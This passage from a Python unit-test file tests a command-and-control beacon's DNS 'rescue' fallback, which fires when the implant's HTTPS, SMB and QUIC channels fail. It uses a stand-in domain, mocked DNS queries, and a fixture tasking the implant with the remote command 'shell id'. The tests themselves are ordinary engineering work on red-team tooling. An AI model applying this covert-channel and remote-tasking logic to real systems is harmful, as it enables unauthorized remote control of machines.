            if "." + dns_rescue.MARKER + "." in name:
                rescues.append(cycle["n"])
                if answer_each_rescue:
                    pending["task"] = True
                return []
            if pending["task"]:
                pending["task"] = False
                return [task]
            return []

        def stop_after(*a, **kw):
            cycle["n"] += 1
            if cycle["n"] >= cycles:
                beacon._running = False

        beacon._running = True
        with unittest.mock.patch.object(beacon, "_jittered_sleep",
                                        stop_after), \
             unittest.mock.patch.object(beacon, "_backoff_sleep",
                                        stop_after), \
             unittest.mock.patch.object(beacon, "_process_tasking_batch",
                                        lambda *_: None), \
             unittest.mock.patch.object(
                 sys.modules["software.c2.beacon"], "_dns_query", query):
            beacon._beacon_loop()
        return rescues

    def test_an_attempt_delivered_over_dns_does_not_re_arm_the_latch(self):
        beacon = _rescue_beacon()
        rescues = self._run(beacon, 12)
        self.assertEqual(len(rescues), 1,
                         "the rescue became periodic: %r" % (rescues,))

    def test_an_upstream_leg_delivering_does_re_arm_it(self):
        # The latch must not become permanent. A beacon whose HTTPS comes
        # back and then dies again has a new story to tell.
        beacon = _a_beacon(
            https={"enabled": True},
            dns={"enabled": True, "domain": "rescue.example",
                 "resolver": "127.0.0.1"})
        state = {"https_up": False}

        def https():
            return {"cmd": "noop"} if state["https_up"] else None

        cycle = {"n": 0}
        rescues = []

        def query(name, qtype, server, timeout=10, status=None,
                  source=""):
            if status is not None:
                status["rcode"] = 0
            if "." + dns_rescue.MARKER + "." in name:
                rescues.append(cycle["n"])
            return []

        def stop_after(*a, **kw):
            cycle["n"] += 1
            # Dead, dead, HTTPS back, dead, dead.
            state["https_up"] = cycle["n"] == 2
            if cycle["n"] >= 5:
                beacon._running = False

        # _beacon_loop registers first when https is enabled, and that
        # loop sleeps through _backoff_sleep -- which this test patches as
        # its cycle counter. Start registered so the counter means cycles.
        beacon._registered = True
        beacon._running = True
        with unittest.mock.patch.object(beacon, "_beacon_https", https), \
             unittest.mock.patch.object(beacon, "_jittered_sleep",
                                        stop_after), \
             unittest.mock.patch.object(beacon, "_backoff_sleep",
                                        stop_after), \
             unittest.mock.patch.object(beacon, "_process_tasking_batch",
                                        lambda *_: None), \
             unittest.mock.patch.object(
                 sys.modules["software.c2.beacon"], "_dns_query", query):
            beacon._beacon_loop()
        self.assertEqual(len(rescues), 2,
                         "a recovered and re-broken upstream leg must earn a "
                         "second rescue; got %r" % (rescues,))


class TestBeingStuckIsNotTheSameAsGettingNothing(unittest.TestCase):
    """The finding an end-to-end run produced and every stub had hidden.

    `api_dns_tasking` answers with an encrypted body **always** -- its own
    docstring says so, deliberately, "so it is not an existence oracle
    even for a token holder". An empty queue therefore decrypts to `{}`,
    `_beacon_dns` returns it, and `tasking` is not None.

    The trigger used to live inside `if tasking is None:`. So a beacon
    whose HTTPS, SMB and QUIC legs were all dead but whose DNS listener
    was reachable looked fine to itself for ever, and the rescue never
    fired -- in exactly the configuration it exists for. Being stuck is
    "no upstream leg delivered", not "nothing came back".
    """

    def _run(self, beacon, cycles, dns_payload):
        sent = []
        count = {"n": 0}

        def query(name, qtype, server, timeout=10, status=None,
                  source=""):
            if status is not None:
                status["rcode"] = 0
            if "." + dns_rescue.MARKER + "." in name:
                sent.append(name)
                return []
            return [dns_payload]

        def stop(*a, **kw):
            count["n"] += 1
            if count["n"] >= cycles:
                beacon._running = False

        beacon._registered = True
        beacon._running = True
        with unittest.mock.patch.object(beacon, "_jittered_sleep", stop), \
             unittest.mock.patch.object(beacon, "_backoff_sleep", stop), \
             unittest.mock.patch.object(beacon, "_process_tasking_batch",
                                        lambda *_: None), \
             unittest.mock.patch.object(
                 sys.modules["software.c2.beacon"], "_dns_query", query):
            beacon._beacon_loop()
        return sent

    def test_an_empty_tasking_body_over_dns_still_counts_as_stuck(self):
        beacon = _rescue_beacon()
        empty = beacon._encrypt({})
        sent = self._run(beacon, 4, empty)
        self.assertEqual(len(sent), 1,
                         "a beacon with no upstream and a reachable DNS "
                         "listener never reported being stuck")

    def test_a_real_task_over_dns_still_counts_as_stuck(self):
        # Receiving work does not mean the way out is open: results of
        # that work cannot be reported either.
        beacon = _rescue_beacon()
        task = beacon._encrypt({"cmd": "shell id"})
        sent = self._run(beacon, 4, task)
        self.assertEqual(len(sent), 1)

    def test_an_upstream_leg_delivering_still_means_not_stuck(self):
        beacon = _a_beacon(
            https={"enabled": True},
            dns={"enabled": True, "domain": "rescue.example",
                 "resolver": "127.0.0.1"})
        with unittest.mock.patch.object(beacon, "_beacon_https",
                                        lambda: {"cmd": "noop"}):
            sent = self._run(beacon, 4, beacon._encrypt({}))
        self.assertEqual(sent, [])


if __name__ == "__main__":
    unittest.main()
